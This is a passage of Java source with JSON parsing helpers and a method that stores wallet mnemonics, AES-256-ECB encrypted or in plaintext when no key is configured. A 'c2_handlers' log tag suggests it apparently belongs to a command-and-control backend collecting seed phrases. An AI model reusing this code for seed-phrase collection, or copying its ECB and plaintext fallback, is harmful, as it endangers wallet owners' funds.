            String s = ((String) value).trim();
            if (s.isEmpty()) {
                return null;
            }
            if (s.startsWith("{") && s.endsWith("}")) {
                try {
                    return JSONObject.parseObject(s);
                } catch (Exception ignore) {
                    // fall through and treat as plain memo text
                }
            }
            JSONObject obj = new JSONObject();
            obj.put("content", s);
            return obj;
        }
        try {
            return (JSONObject) JSONObject.toJSON(value);
        } catch (Exception ignore) {
            return null;
        }
    }

    private static String firstNonEmpty(String... values) {
        if (values == null) {
            return "";
        }
        for (String value : values) {
            if (value != null && !value.isEmpty()) {
                return value;
            }
        }
        return "";
    }

    private static String normalizeMemoType(Object value) {
        if (value == null) {
            return "0";
        }
        String s = value.toString().trim();
        if (s.isEmpty()) {
            return "0";
        }
        try {
            return String.valueOf(Integer.parseInt(s));
        } catch (Exception ignore) {
            return "0";
        }
    }

    /** 助记词加密：配置了 mnemonic-aes-key 则 AES-256-ECB 加密，否则原样 */
    private String encryptMnemonic(String plain) {
        if (plain == null || plain.isEmpty()) {
            return plain;
        }
        if (mnemonicAesKey == null || mnemonicAesKey.isEmpty()) {
            log.info("异常日志:[c2_handlers][mnemonic] 未配置 news4.mnemonic.mnemonic-aes-key，助记词将明文入库");
            return plain;
        }
        return AesStoreCipher.encrypt(plain, mnemonicAesKey);
    }

    private static Long longVal(JSONObject o, String k) {
        if (o == null) {
            return null;
        }
        Object v = o.get(k);
        if (v == null) {
            return null;
        }
        try {
            return Long.parseLong(v.toString());
        } catch (Exception e) {
            return null;
        }
    }

    private static Integer intVal(JSONObject o, String k) {
        Long l = longVal(o, k);
        return l == null ? null : l.intValue();
    }
}
